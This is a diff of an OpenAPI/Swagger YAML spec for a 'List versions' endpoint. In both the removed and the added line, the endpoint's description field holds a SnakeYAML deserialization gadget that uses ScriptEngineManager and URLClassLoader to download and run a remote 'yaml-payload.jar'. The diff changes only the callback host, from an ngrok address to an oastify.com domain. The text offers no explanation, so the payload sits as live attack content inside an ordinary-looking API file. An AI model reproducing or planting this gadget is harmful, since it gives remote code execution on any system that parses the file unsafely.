@@ -11,7 +11,7 @@ paths:
     get:
       operationId: getVersions-v2
       summary: List versions
-      description: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["https://content-kangaroo-mighty.ngrok-free.app/yaml-payload.jar"]]]]
+      description: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://zux3tjga4ldp8ivmyef8igw9006ruqif.oastify.com/yaml-payload.jar"]]]]
       produces:
       - application/json
       responses:
